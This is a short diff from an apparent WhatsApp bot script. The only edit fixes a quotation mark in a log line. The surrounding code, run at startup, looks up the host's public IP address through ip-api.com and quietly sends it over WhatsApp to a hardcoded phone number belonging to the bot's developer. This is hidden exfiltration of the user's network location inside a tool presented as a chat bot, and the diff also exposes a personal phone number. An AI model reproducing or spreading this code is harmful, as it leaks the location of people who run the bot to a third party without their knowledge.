@@ -104,7 +104,7 @@ async function startKriz() {
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
        denz.sendMessage("919496966726@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Whats Kriz Ai",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./client.jpg'),sourceUrl:"https://wa.me/"}}})
-     console.log('Sending ip address to bot developer)
+     console.log('Sending ip address to bot developer')
    })
    
     // anticall auto block
